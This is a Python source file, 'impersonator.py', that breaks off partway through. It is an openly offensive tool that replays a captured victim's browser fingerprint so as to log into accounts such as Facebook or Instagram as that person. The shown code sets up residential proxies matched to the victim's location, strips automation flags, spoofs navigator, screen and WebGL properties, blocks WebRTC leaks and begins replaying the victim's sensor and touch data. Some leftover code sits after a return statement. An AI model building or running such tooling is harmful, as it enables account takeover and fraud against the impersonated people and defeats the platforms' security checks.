# impersonator.py - Digital Twin Impersonation Engine

import argparse
import json
import time
import random
import os
import re
import zipfile
import requests
import tempfile
import getpass
import hashlib
from datetime import datetime
from pathlib import Path
from seleniumwire import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CONFIGURATION CONSTANTS ---
# Time delays (configurable via environment variables)
DEVTOOLS_INIT_DELAY = float(os.getenv('DEVTOOLS_INIT_DELAY', '1.5'))
FINGERPRINT_VERIFICATION_DELAY = int(os.getenv('VERIFICATION_DELAY', '30'))
PROXY_CHECK_DELAY = int(os.getenv('PROXY_CHECK_DELAY', '3'))
PROXY_RETRY_DELAY = int(os.getenv('PROXY_RETRY_DELAY', '5'))
WARMUP_DELAY_MIN = float(os.getenv('WARMUP_DELAY_MIN', '4.0'))
WARMUP_DELAY_MAX = float(os.getenv('WARMUP_DELAY_MAX', '7.0'))
HUMAN_TYPE_DELAY_MIN = float(os.getenv('HUMAN_TYPE_DELAY_MIN', '0.05'))
HUMAN_TYPE_DELAY_MAX = float(os.getenv('HUMAN_TYPE_DELAY_MAX', '0.2'))
FIELD_DELAY_MIN = float(os.getenv('FIELD_DELAY_MIN', '0.5'))
FIELD_DELAY_MAX = float(os.getenv('FIELD_DELAY_MAX', '1.2'))
SUBMIT_DELAY_MIN = float(os.getenv('SUBMIT_DELAY_MIN', '0.8'))
SUBMIT_DELAY_MAX = float(os.getenv('SUBMIT_DELAY_MAX', '1.5'))
BEHAVIORAL_DELAY_MIN = float(os.getenv('BEHAVIORAL_DELAY_MIN', '0.1'))
BEHAVIORAL_DELAY_MAX = float(os.getenv('BEHAVIORAL_DELAY_MAX', '0.3'))

# Retry and attempt limits
PROXY_VERIFICATION_MAX_ATTEMPTS = int(os.getenv('PROXY_VERIFICATION_MAX_ATTEMPTS', '5'))
LOGIN_VERIFICATION_TIMEOUT = int(os.getenv('LOGIN_VERIFICATION_TIMEOUT', '20'))
ELEMENT_WAIT_TIMEOUT = int(os.getenv('ELEMENT_WAIT_TIMEOUT', '15'))

# Security settings
MASK_CREDENTIALS_IN_LOGS = os.getenv('MASK_CREDENTIALS_IN_LOGS', 'true').lower() == 'true'
CREDENTIAL_MASK_LENGTH = int(os.getenv('CREDENTIAL_MASK_LENGTH', '3'))

def handle_cdp_error(operation_name, error, raise_on_critical=True):
    """
    Centralized error handler for CDP operations.
    
    Args:
        operation_name: Name of the CDP operation that failed
        error: The exception that occurred
        raise_on_critical: If True, raise the error; if False, log warning only
    
    Returns:
        None (raises exception if raise_on_critical=True)
    """
    if raise_on_critical:
        print(f"[ERROR] Failed {operation_name}: {error}")
        raise
    else:
        print(f"[WARNING] {operation_name} failed: {error}")


def _extract_ip_from_text(response_text: str) -> str:
    """Extract an IPv4 address from an IP-check service response.

    Handles both JSON (e.g. api.ipify.org) and plaintext/HTML responses.
    Raises a RuntimeError when a 502 Bad Gateway is detected so callers can
    treat upstream failures differently from real proxy misconfiguration.
    """
    text = (response_text or "").strip()
    if not text:
        raise ValueError("Empty response from IP check service")

    # Try JSON first (api.ipify.org style)
    try:
        data = json.loads(text)
        ip = data.get("ip")
        if ip:
            return ip
    except json.JSONDecodeError:
        pass

    # Detect common upstream error pattern (e.g. 502 from proxy/upstream)
    if "502" in text and "bad gateway" in text.lower():
        raise RuntimeError(f"IP check service returned 502 Bad Gateway: {text[:100]}")

    # Fallback: try to extract a bare IPv4 address from the body
    ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text)
    if ip_match:
        print(f"[WARNING] Extracted IP from non-JSON response: {text[:50]}...")
        return ip_match.group(0)

    raise ValueError(f"Could not parse IP from response: {text[:100]}")


def _get_proxy_ip_via_driver(driver, urls=None):
    if urls is None:
        urls = [
            "https://api.ipify.org?format=json",
            "https://checkip.amazonaws.com",
            "https://ipinfo.io/json",
        ]

    last_error = None
    for url in urls:
        try:
            driver.get(url)
            time.sleep(PROXY_CHECK_DELAY)
            if hasattr(driver, 'page') and driver.page is not None:
                body_text = driver.page.locator('body').inner_text().strip()
            else:
                body_text = driver.find_element(By.TAG_NAME, 'body').text.strip()

            ip = _extract_ip_from_text(body_text)
            if ip:
                print(f"[INFO] IP check via {url} returned {ip}")
                return ip
        except Exception as e:
            print(f"[WARNING] IP check failed via {url}: {e}")
            last_error = e
            continue

    if last_error:
        raise last_error
    raise RuntimeError("All IP check services failed")


def mask_credential(credential, mask_length=CREDENTIAL_MASK_LENGTH):
    """
    Mask sensitive credential data for logging.
    
    Args:
        credential: The credential string to mask
        mask_length: Number of characters to show at the start
    
    Returns:
        Masked credential string (e.g., "user123...***")
    """
    if not MASK_CREDENTIALS_IN_LOGS or not credential:
        return credential
    if len(credential) <= mask_length:
        return '*' * len(credential)
    return f"{credential[:mask_length]}...{'*' * min(len(credential) - mask_length, 10)}"


def generate_dataimpulse_proxy(session_data, dataimpulse_username, dataimpulse_password, protocol="socks5", proxy_type="rotating"):
    """
    Auto-generate DataImpulse proxy string in simplified format.
    
    Args:
        session_data: Dict from sessions.json (location data is extracted but not used in simplified format)
        dataimpulse_username: DataImpulse account username
        dataimpulse_password: DataImpulse account password
    
    Returns:
        Simplified DataImpulse proxy string format: username:password@host:port
        Example: 768b27aac68d92f840d9:b7564921f7b4962f@gw.dataimpulse.com:823
    """
    def clean_param(text):
        """Standardized location cleaning: lowercase alphanumeric only (DataImpulse compatible)"""
        if not text: return ""
        return re.sub(r'[^a-zA-Z0-9]', '', str(text)).lower()
    
    location = session_data.get('location', {})
    
    # Extract location from ip-api.com data stored in sessions.json
    country = clean_param(location.get('country', 'PH'))  # 'PH' → 'ph'
    region = clean_param(location.get('region', 'Metro Manila'))  # 'Metro Manila' → 'metromanila'
    city = clean_param(location.get('city', 'Manila'))  # 'Caloocan City' → 'caloocancity'
    zip_code = location.get('zip', '1000')  # '1409'
    asn = location.get('asn', '132199')  # '132199'
    
    # Build location parameter string
    location_params = f"cr.{country};state.{region};city.{city};zip.{zip_code};asn.{asn}"
    
    # Determine port based on proxy type
    port = 10000 if proxy_type == "sticky" else 823
    
    # Build username with location parameters
    username_with_location = f"{dataimpulse_username}__{location_params}"
    
    # Construct complete proxy string with protocol
    # Format: protocol://username__cr.ph;state.x;city.y:password@host:port
    proxy_string = f"{protocol}://{username_with_location}:{dataimpulse_password}@gw.dataimpulse.com:{port}"
    
    print(f"[INFO] Generated DataImpulse proxy:")
    print(f"  Protocol: {protocol}")
    print(f"  Type: {proxy_type} (port {port})")
    print(f"  Username: {dataimpulse_username}")
    print(f"  Gateway: gw.dataimpulse.com:{port}")
    print(f"  Proxy: {proxy_string}")
    
    return proxy_string
    
    config_file.write(config_content)
    config_file.close()
    
    print(f"[INFO] Created proxy config file: {config_file.name}")
    return config_file.name

def create_dataimpulse_pac_file(username, password, host, port):
    """Create a PAC file for DataImpulse HTTP proxy authentication."""
    
    # Create temporary PAC file
    pac_file = tempfile.NamedTemporaryFile(mode='w', suffix='.pac', delete=False)
    
    # PAC file content
    pac_content = f"""
function FindProxyForURL(url, host) {{
    // Always use DataImpulse proxy for all requests
    return "PROXY {host}:{port}";
}}
"""
    
    pac_file.write(pac_content)
    pac_file.close()
    
    print(f"[INFO] Created PAC file: {pac_file.name}")
    return pac_file.name

def create_dataimpulse_proxy_extension(username, password, host, port):
    """Create a Chrome extension for DataImpulse HTTP proxy authentication."""
    
    # Create temporary directory for extension
    extension_dir = tempfile.mkdtemp(prefix="dataimpulse_proxy_")
    
    # Manifest file
    manifest = {
    "version": "1.0.0",
    "manifest_version": 2,
        "name": "DataImpulse Proxy",
    "permissions": [
        "proxy",
        "tabs",
        "unlimitedStorage",
        "storage",
        "webRequest",
            "webRequestBlocking",
            "<all_urls>"
    ],
    "background": {
        "scripts": ["background.js"]
    },
        "minimum_chrome_version": "22.0.0"
    }
    
    # Background script for HTTP proxy
    background_js = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{
            scheme: "http",
            host: "{host}",
            port: parseInt("{port}")
        }},
        bypassList: ["localhost"]
    }}
}};

chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{
    console.log("DataImpulse HTTP proxy settings applied");
}});

function callbackFn(details) {{
    console.log("Auth required for:", details.url);
    return {{
        authCredentials: {{
            username: "{username}",
            password: "{password}"
        }}
    }};
}}

chrome.webRequest.onAuthRequired.addListener(
    callbackFn,
    {{urls: ["<all_urls>"]}},
    ['blocking']
);

console.log("DataImpulse HTTP proxy extension loaded");
"""
    
    # Write files
    with open(os.path.join(extension_dir, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2)
    
    with open(os.path.join(extension_dir, "background.js"), "w") as f:
        f.write(background_js)
    
    print(f"[INFO] Created DataImpulse HTTP proxy extension in: {extension_dir}")
    return extension_dir

def match_device_profile(victim_fingerprint, device_database):
    """Match victim fingerprint to most similar device profile"""
    best_match = None
    best_score = 0
    
    for device_model, profile in device_database.items():
        score = calculate_similarity(victim_fingerprint, profile)
        if score > best_score:
            best_score = score
            best_match = device_model
    
    return best_match if best_score > 50 else None

def calculate_similarity(fp1, fp2):
    """Calculate similarity between two fingerprints"""
    score = 0
    
    # Screen resolution match
    if fp1.get('screenResolution') == fp2.get('hardware', {}).get('screenResolution'):
        score += 20
    
    # User agent similarity
    if compare_user_agents(fp1.get('userAgent'), fp2.get('hardware', {}).get('userAgent')):
        score += 30
    
    # Sensor characteristics
    if fp1.get('gyroscopeFrequency') == fp2.get('sensors', {}).get('gyroscopeFrequency'):
        score += 25
    
    # Touch capabilities
    if fp1.get('maxTouchPoints') == fp2.get('hardware', {}).get('maxTouchPoints'):
        score += 15
    
    # WebGL renderer
    if fp1.get('webGLRenderer') == fp2.get('webgl', {}).get('renderer'):
        score += 10
    
    return score

def compare_user_agents(ua1, ua2):
    """Compare user agents for similarity"""
    if not ua1 or not ua2:
        return False
    
    # Extract device type from user agent
    ua1_lower = ua1.lower()
    ua2_lower = ua2.lower()
    
    # Check for iPhone
    if 'iphone' in ua1_lower and 'iphone' in ua2_lower:
        return True
    
    # Check for Android
    if 'android' in ua1_lower and 'android' in ua2_lower:
        return True
    
    # Check for Samsung
    if 'samsung' in ua1_lower and 'samsung' in ua2_lower:
        return True
    
    # Check for Pixel
    if 'pixel' in ua1_lower and 'pixel' in ua2_lower:
        return True
    
    return False

def create_driver(profile_data, proxy_string=None, use_camoufox=False):
    """
    Creates and configures a WebDriver instance with a forged fingerprint.
    
    Args:
        profile_data: Victim profile dictionary
        proxy_string: Optional proxy string
        use_camoufox: If True, use Camoufox (Firefox/Playwright), else use Chrome/Selenium
    
    Returns:
        WebDriver instance (Selenium or Camoufox)
    """
    if use_camoufox:
        # Use Camoufox (Firefox/Playwright)
        try:
            from camoufox_driver import CamoufoxDriver
            print("[INFO] Using Camoufox (Firefox/Playwright) - C++ level fingerprint injection")
            
            # Check if proxy is SOCKS5 with auth (not supported by Playwright Firefox)
            if proxy_string and proxy_string.startswith('socks5://') and '@' in proxy_string:
                print("[WARNING] SOCKS5 proxy with authentication detected")
                print("[WARNING] Playwright Firefox does NOT support SOCKS5 proxy authentication")
                print("[INFO] Automatically falling back to Chrome/Selenium (supports SOCKS5)")
                print("[INFO] To use Camoufox, you need HTTP proxy or no proxy")
                use_camoufox = False  # Force fallback to Chrome/Selenium
            else:
                # Only try Camoufox if not SOCKS5 with auth
                driver = CamoufoxDriver(profile_data, proxy_string, headless=False)
                driver.start()
                return driver
        except ImportError as e:
            print(f"[ERROR] Camoufox not available: {e}")
            print("[INFO] Falling back to Chrome/Selenium...")
            use_camoufox = False
        except ValueError as e:
            if "not supported" in str(e).lower():
                print(f"[ERROR] {e}")
                print("[INFO] Falling back to Chrome/Selenium...")
                use_camoufox = False
                # Retry with Chrome/Selenium
                if not use_camoufox:
                    print("[INFO] Using Chrome/Selenium instead (supports SOCKS5 with auth)")
            else:
                raise
    
    if not use_camoufox:
        # Use Chrome/Selenium (original implementation)
        print("[INFO] Forging browser identity...")
    
    # Use victim's actual fingerprint data only - no device profile matching
    print("[INFO] Using victim's actual fingerprint data for perfect impersonation")
    
    # Get fingerprint data
    fp = profile_data.get('fingerprint')
    if not fp:
        raise KeyError("'fingerprint' key not found in profile data.")
    
    options = webdriver.ChromeOptions()
    
    # --- Proxy Configuration via selenium-wire (supports SOCKS5 with auth) ---
    seleniumwire_options = {}
    
    if proxy_string:
        print("[INFO] Configuring proxy via selenium-wire (SOCKS5 auth support)...")
        
        # --- DYNAMIC PROXY PARSING ---
        # Handles both formats:
        # 1. Simplified format: username:password@host:port (e.g., 768b27aac68d92f840d9:b7564921f7b4962f@gw.dataimpulse.com:823)
        # 2. Complex format: socks5://username__cr.ph;state.x;city.y:password@host:port
        # 3. DataImpulse format: username__cr.country;state.state;zip.zip:password@gw.dataimpulse.com:823
        scheme = "socks5" # Default scheme for DataImpulse
        
        # Remove scheme prefix if present
        original_proxy_string = proxy_string
        if proxy_string.startswith('socks5://'):
            scheme = "socks5"
            proxy_string = proxy_string[9:]  # Remove 'socks5://'
        elif proxy_string.startswith('http://'):
            scheme = "http"
            proxy_string = proxy_string[7:]   # Remove 'http://'
        
        # Parse format: username:password@host:port (or username__location:password@host:port for complex format)
        # Find the LAST colon before @ to split username (or username__location) from password
        at_pos = proxy_string.rfind('@')
        if at_pos == -1:
            raise ValueError("Proxy string missing @ separator. Format: username:password@host:port")
        
        credentials_part = proxy_string[:at_pos]  # username__location:password
        host_port_part = proxy_string[at_pos+1:]  # host:port
        
        # Find LAST colon in credentials_part to split username (or username__location) from password
        last_colon_pos = credentials_part.rfind(':')
        if last_colon_pos == -1:
            raise ValueError("Proxy string missing password. Format: username:password@host:port")
        
        proxy_user = credentials_part[:last_colon_pos]  # username or username__location
        proxy_pass = credentials_part[last_colon_pos+1:]  # password
        
        # Parse host:port
        last_colon_host = host_port_part.rfind(':')
        if last_colon_host == -1:
            raise ValueError("Proxy string missing port. Format: username:password@host:port")
        
        proxy_host = host_port_part[:last_colon_host]
        proxy_port = host_port_part[last_colon_host+1:]
        
        masked_user = mask_credential(proxy_user, 20)
        print(f"[DEBUG] Proxy parsed: Scheme={scheme}, Host={proxy_host}, Port={proxy_port}, User={masked_user}")

        # Configure proxy via selenium-wire (supports SOCKS5 with authentication)
        if scheme == "socks5":
            # selenium-wire supports SOCKS5 with authentication directly
            proxy_url = f"socks5://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
            seleniumwire_options = {
                'proxy': {
                    'http': proxy_url,
                    'https': proxy_url,
                    'no_proxy': 'localhost,127.0.0.1'
                }
            }
            masked_user = mask_credential(proxy_user, 20)
            masked_pass = mask_credential(proxy_pass, CREDENTIAL_MASK_LENGTH)
            print(f"[INFO] SOCKS5 proxy configured with authentication via selenium-wire")
            print(f"[INFO] Proxy URL: socks5://{masked_user}:{masked_pass}@{proxy_host}:{proxy_port}")
        elif scheme == "http":
            # HTTP proxy with authentication
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
            seleniumwire_options = {
                'proxy': {
                    'http': proxy_url,
                    'https': proxy_url,
                    'no_proxy': 'localhost,127.0.0.1'
                }
            }
            masked_user = mask_credential(proxy_user, 20)
            masked_pass = mask_credential(proxy_pass, CREDENTIAL_MASK_LENGTH)
            print(f"[INFO] HTTP proxy configured with authentication via selenium-wire")
            print(f"[INFO] Proxy URL: http://{masked_user}:{masked_pass}@{proxy_host}:{proxy_port}")
        else:
            raise ValueError(f"Unsupported proxy scheme: {scheme}")
    else:
        print("[INFO] No proxy configured - running with direct connection.")

    # --- Anti-Automation Flags ---
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)

    # --- Browser Compatibility for Facebook/Instagram ---
    # Use victim's actual user-agent exactly as captured (no modifications)
    victim_user_agent = fp.get('userAgent', 'Mozilla/5.0 (Linux; Android 12; V2026 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/142.0.7444.48 Mobile Safari/537.36')
    
    # Extract Chrome version from victim's user-agent and adjust if needed (only for compatibility)
    chrome_match = re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', victim_user_agent)
    if chrome_match:
        victim_chrome_version = chrome_match.group(1)
        print(f"[INFO] Victim's Chrome version: {victim_chrome_version}")
        
        # Force latest Chrome version to avoid outdated browser detection
        # NOTE: For mobile impersonation and exact fingerprint replay, we no longer rewrite
        # the user agent here. The victim's userAgent string is used as-is.
    
    print(f"[INFO] Using victim's user agent (exact fingerprint): {victim_user_agent[:80]}...")
    options.add_argument(f"--user-agent={victim_user_agent}")
    options.add_argument("--accept-lang=en-US,en;q=0.9")
    options.add_argument("--disable-features=VizDisplayCompositor")
    
    # --- DISABLE XDG-OPEN DIALOGS ---
    options.add_argument("--disable-external-protocol-handlers")
    options.add_argument("--disable-protocol-handlers")
    options.add_argument("--disable-web-security")
    options.add_argument("--disable-features=TranslateUI")
    options.add_argument("--disable-ipc-flooding-protection")
    
    # Additional XDG-OPEN blocking
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-plugins")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-renderer-backgrounding")
    
    # Chromium-specific arguments
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--remote-debugging-port=9222")
    
    # --- AUTO-OPEN DEVTOOLS WITH DEVICE EMULATION ---
    # Automatically open DevTools when browser launches
    options.add_argument("--auto-open-devtools-for-tabs")
    options.add_experimental_option("useAutomationExtension", False)
    # Enable DevTools features and device emulation
    options.add_argument("--enable-features=DevTools")
    # Ensure device toolbar is visible by default
    options.add_argument("--force-device-scale-factor=1")
    # Enable mobile emulation features
    options.add_argument("--enable-features=MobileEmulation")
    
    # Block external app launches
    prefs = {
        "protocol_handler": {
            "excluded_schemes": {
                "fb": False,
                "fbmessenger": False,
                "fb-messenger": False,
                "fbs": False,
                "fb-pma": False,
                "fbauth": False,
                "fbauth2": False,
                "fbshare": False,
                "instagram": False,
                "itms-services": False, # Para sa iOS app installs
                "market": False # Para sa Android Play Store
            }
        },
        "profile.default_content_setting_values": {
            "notifications": 2,  # Block notifications
            "geolocation": 2,    # Block geolocation
            "media_stream": 2    # Block media access
        }
    }
    options.add_experimental_option("prefs", prefs)
    
    # --- Headless Configuration ---
    # options.add_argument("--headless")
    # options.add_argument("--window-size=1920,1080") # Set a default window size for headless

    # Initialize driver with browser detection
    service = ChromeService(ChromeDriverManager().install())
    
    # Browser detection - prioritize Chromium over Google Chrome
    chrome_path = None
    chromium_path = None
    
    # Check for Chromium first (preferred)
    chromium_paths = [
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/snap/bin/chromium"
    ]
    for path in chromium_paths:
        if os.path.exists(path):
            chromium_path = path
            break
    
    # Check for Google Chrome as fallback
    chrome_paths = [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/opt/google/chrome/chrome"
    ]
    for path in chrome_paths:
        if os.path.exists(path):
            chrome_path = path
            break
    
    # Set binary location
    if chromium_path:
        options.binary_location = chromium_path
        print(f"[INFO] Using Chromium browser: {chromium_path}")
    elif chrome_path:
        options.binary_location = chrome_path
        print(f"[INFO] Using Google Chrome browser: {chrome_path}")
    else:
        print("[INFO] Using default browser (no binary path specified)")
    
    # Create driver with selenium-wire (supports SOCKS5 authentication)
    if seleniumwire_options:
        driver = webdriver.Chrome(service=service, options=options, seleniumwire_options=seleniumwire_options)
        print("[INFO] Driver created with selenium-wire proxy configuration")
    else:
        driver = webdriver.Chrome(service=service, options=options)
        print("[INFO] Driver created without proxy")
    
    # Wait for DevTools to fully initialize
    time.sleep(DEVTOOLS_INIT_DELAY)
    print("[INFO] DevTools auto-opened - initializing device emulation mode...")

    # --- DevTools Protocol Injection (The Master Key) ---
    # FIX: The key is 'fingerprint', not 'device_fingerprint'.
    fp = profile_data.get('fingerprint')
    if not fp:
        raise KeyError("'fingerprint' key not found in profile data.")

    # FIX: Corrected keys to match the JSON profile (e.g., 'screenResolution' instead of 'screen_resolution')
    width, height = map(int, fp.get('screenResolution', '393x852').split('x'))
    platform = fp.get('platform', 'Win32')
    hardware_concurrency = fp.get('hardwareConcurrency', 8)
    device_memory = fp.get('deviceMemory', 8)
    user_agent = fp.get('userAgent')

    if not user_agent:
        raise KeyError("'userAgent' not found in fingerprint data.")
    
    # Use victim's user agent exactly as captured (no modifications for fingerprint accuracy)

    # --- PARSE COMPLEX PROPERTIES FOR JAVASCRIPT INJECTION ---
    # Parse languages array (handle string, list, or single value)
    languages_raw = fp.get('languages', [fp.get('language', 'en-US')])
    if isinstance(languages_raw, str):
        languages_list = [l.strip() for l in languages_raw.split(',') if l.strip()]
    elif isinstance(languages_raw, list):
        languages_list = [str(l).strip() for l in languages_raw if l]
    else:
        languages_list = [str(languages_raw)] if languages_raw else ['en-US']
    if not languages_list:
        languages_list = ['en-US']
    languages_js = json.dumps(languages_list)
    
    # Parse fonts array
    fonts_raw = fp.get('fonts', [])
    if isinstance(fonts_raw, str):
        fonts_list = [f.strip() for f in fonts_raw.split(',') if f.strip()]
    elif isinstance(fonts_raw, list):
        fonts_list = [str(f).strip() for f in fonts_raw if f]
    else:
        fonts_list = []
    fonts_js = json.dumps(fonts_list)
    
    # Get orientation type (check both keys)
    orientation_type = fp.get('orientationType', fp.get('orientation', 'portrait-primary'))
    orientation_angle = fp.get('orientationAngle', 0)
    
    # Get devicePixelRatio
    device_pixel_ratio = fp.get('devicePixelRatio', 3)
    
    # Get WebGL unmasked values (with fallback to masked values)
    webgl_unmasked_vendor = fp.get('webGLUnmaskedVendor', fp.get('webGLVendor', 'Google Inc. (Intel)'))
    webgl_unmasked_renderer = fp.get('webGLUnmaskedRenderer', fp.get('webGLRenderer', 'ANGLE (Intel)'))

    # --- ADVANCED FINGERPRINT REPLAY ---
    # Inject all captured properties from victim's fingerprint
    js_override_script = f"""
        // INJECTION GUARD - Prevent multiple injections
        if (window.__NyxSecInjected) {{
            return; // Already injected, skip
        }}
        window.__NyxSecInjected = true;
        
        // Existing injections
        Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
        Object.defineProperty(navigator, 'platform', {{ get: () => '{platform}' }});
        Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hardware_concurrency} }});
        Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {device_memory} }});
        Object.defineProperty(navigator, 'language', {{ get: () => '{fp.get('language','en-US')}' }});
        Object.defineProperty(navigator, 'languages', {{ get: () => {languages_js} }});
        Object.defineProperty(navigator, 'vendor', {{ get: () => '{fp.get('vendor', 'Google Inc.')}' }});
        Object.defineProperty(navigator, 'userAgent', {{ get: () => '{user_agent}' }});
        Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {fp.get('touchSupport', 1)} }});
        Object.defineProperty(window, 'devicePixelRatio', {{ get: () => {device_pixel_ratio} }});
        
        // Screen properties (existing)
        Object.defineProperty(screen, 'width', {{ get: () => {width} }});
        Object.defineProperty(screen, 'height', {{ get: () => {height} }});
        Object.defineProperty(screen, 'colorDepth', {{ get: () => {fp.get('colorDepth',24)} }});
        
        // NEW: Additional screen properties
        Object.defineProperty(screen, 'availWidth', {{ get: () => {fp.get('screenAvailWidth', width)} }});
        Object.defineProperty(screen, 'availHeight', {{ get: () => {fp.get('screenAvailHeight', height)} }});
        Object.defineProperty(screen, 'pixelDepth', {{ get: () => {fp.get('pixelDepth', 24)} }});
        
        // Timezone spoof (existing)
        Intl.DateTimeFormat = function() {{ return {{ resolvedOptions: () => {{ return {{ timeZone: '{fp.get('timezone','Asia/Manila')}' }}; }} }}; }};
        
        // NEW: Battery API using victim's actual data
        navigator.getBattery = () => Promise.resolve({{
            level: {fp.get('batteryLevel', 0.5)},
            charging: {str(fp.get('batteryCharging', False)).lower()},
            chargingTime: Infinity,
            dischargingTime: Infinity
        }});
        
        // NEW: Connection API using victim's actual data
        Object.defineProperty(navigator, 'connection', {{
            get: () => ({{
                effectiveType: '{fp.get('connectionType', '4g')}',
                downlink: {fp.get('connectionDownlink', 10)},
                rtt: 50,
                saveData: false
            }})
        }});
        
        // NEW: Device Orientation using victim's actual data
        Object.defineProperty(screen, 'orientation', {{
            get: () => ({{
                type: '{orientation_type}',
                angle: {orientation_angle}
            }})
        }});
        
        // NEW: Do Not Track
        Object.defineProperty(navigator, 'doNotTrack', {{ get: () => '{fp.get('doNotTrack', '1')}' }});
        
        // NEW: Cookie Enabled
        Object.defineProperty(navigator, 'cookieEnabled', {{ get: () => {str(fp.get('cookieEnabled', True)).lower()} }});
        
        // NEW: Plugin Count
        const pluginCount = {fp.get('pluginCount', 0)};
        Object.defineProperty(navigator, 'plugins', {{
            get: () => {{
                const plugins = [];
                for (let i = 0; i < pluginCount; i++) {{
                    plugins.push({{ 
                        name: 'Plugin ' + i, 
                        description: 'Plugin ' + i,
                        filename: 'plugin' + i + '.dll',
                        length: 1
                    }});
                }}
                return plugins;
            }}
        }});
        
        // NEW: Storage APIs
        Object.defineProperty(window, 'localStorage', {{ 
            get: () => {{
                if ({str(fp.get('localStorage', True)).lower()}) {{
                    return window.localStorage || {{}};
                }}
                return null;
            }}
        }});
        Object.defineProperty(window, 'sessionStorage', {{ 
            get: () => {{
                if ({str(fp.get('sessionStorage', True)).lower()}) {{
                    return window.sessionStorage || {{}};
                }}
                return null;
            }}
        }});
        Object.defineProperty(window, 'indexedDB', {{ 
            get: () => {{
                if ({str(fp.get('indexedDB', True)).lower()}) {{
                    return window.indexedDB || null;
                }}
                return null;
            }}
        }});
        
        // NEW: Font Fingerprinting
        const victimFonts = {fonts_js};
        Object.defineProperty(navigator, 'fonts', {{
            get: () => {{
                const fontSet = new Set(victimFonts);
                return {{
                    check: (font) => fontSet.has(font),
                    values: () => fontSet.values(),
                    forEach: (callback) => fontSet.forEach(callback),
                    size: fontSet.size
                }};
            }}
        }});
        
        // NEW: WebRTC Blocking (Critical Security)
        // Completely remove WebRTC APIs
        delete window.RTCPeerConnection;
        delete window.webkitRTCPeerConnection;
        delete window.mozRTCPeerConnection;
        delete window.RTCSessionDescription;
        delete window.RTCIceCandidate;
        delete window.RTCDataChannel;
        delete window.RTCRtpTransceiver;
        delete window.RTCRtpSender;
        delete window.RTCRtpReceiver;
        delete window.RTCDtlsTransport;
        delete window.RTCIceTransport;
        delete window.RTCTrackEvent;
        delete window.RTCStatsReport;
        delete window.RTCErrorEvent;
        delete window.RTCError;
        
        // Set to undefined as fallback
        window.RTCPeerConnection = undefined;
        window.webkitRTCPeerConnection = undefined;
        window.mozRTCPeerConnection = undefined;
        window.RTCSessionDescription = undefined;
        window.RTCIceCandidate = undefined;
        window.RTCDataChannel = undefined;
        window.RTCRtpTransceiver = undefined;
        window.RTCRtpSender = undefined;
        window.RTCRtpReceiver = undefined;
        window.RTCDtlsTransport = undefined;
        window.RTCIceTransport = undefined;
        window.RTCTrackEvent = undefined;
        window.RTCStatsReport = undefined;
        window.RTCErrorEvent = undefined;
        window.RTCError = undefined;
        
        // Block WebRTC methods in navigator
        if (window.navigator) {{
            Object.defineProperty(window.navigator, 'getUserMedia', {{ 
                get: () => undefined,
                set: () => undefined,
                configurable: false
            }});
            Object.defineProperty(window.navigator, 'webkitGetUserMedia', {{ 
                get: () => undefined,
                set: () => undefined,
                configurable: false
            }});
            Object.defineProperty(window.navigator, 'mozGetUserMedia', {{ 
                get: () => undefined,
                set: () => undefined,
                configurable: false
            }});
            Object.defineProperty(window.navigator, 'mediaDevices', {{ 
                get: () => undefined,
                set: () => undefined,
                configurable: false
            }});
        }}
        
        // Override WebRTC constructor
        window.RTCPeerConnection = function() {{
            throw new Error('WebRTC is disabled for security');
        }};
        window.webkitRTCPeerConnection = function() {{
            throw new Error('WebRTC is disabled for security');
        }};
        window.mozRTCPeerConnection = function() {{
            throw new Error('WebRTC is disabled for security');
        }};
        
        console.log('[NyxSec] WebRTC completely blocked for security');
        
        // BIOMETRIC REPLAY ENGINE - 1:1 Victim Data Replay
        (function() {{
            // Inject fingerprint data as deviceProfile for fallback simulation
            const deviceProfile = {{
                deviceModel: '{fp.get('deviceModel', 'Unknown')}',
                orientation: '{orientation_type}',
                sensors: {{
                    gyroscopeNoise: {fp.get('gyroscopeNoise', 0.1)},
                    gyroscopeDrift: {fp.get('gyroscopeDrift', 0.01)},
                    gyroscopeFrequency: {fp.get('gyroscopeFrequency', 60)},
                    accelerometerNoise: {fp.get('accelerometerNoise', 0.1)},
                    accelerometerGravity: {fp.get('accelerometerGravity', 9.81)},
                    accelerometerFrequency: {fp.get('accelerometerFrequency', 60)}
                }},
                touch: {{
                    pressureRange: {json.dumps(fp.get('touchPressureRange', [0.5, 1.0]))},
                    sizeRange: {json.dumps(fp.get('touchSizeRange', [8, 12]))}
                }},
                battery: {{
                    initialLevel: {fp.get('batteryLevel', 0.5)},
                    drainRate: {fp.get('batteryDrainRate', 0.0001)}
                }},
                network: {{
                    effectiveType: '{fp.get('connectionType', '4g')}',
                    downlink: {fp.get('connectionDownlink', 10)},
                    rtt: 50,
                    saveData: {str(fp.get('saveData', False)).lower()}
                }}
            }};
            
            const victimSensors = {json.dumps(fp.get('mobileSensors', []))};
            const victimTouchPatterns = {json.dumps(fp.get('touchPatterns', []))};
            
            // BIOMETRIC SENSOR REPLAY FUNCTION
            function replaySensorStream(sensorData) {{
                // Ensure sensorData is an array
